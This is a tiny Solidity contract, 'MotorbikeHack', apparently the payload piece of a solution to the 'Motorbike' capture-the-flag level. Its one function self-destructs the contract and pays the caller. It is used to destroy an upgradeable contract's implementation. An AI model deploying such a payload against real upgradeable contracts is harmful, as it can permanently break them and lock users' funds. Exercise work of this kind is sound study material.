// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

contract MotorbikeHack {
    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}
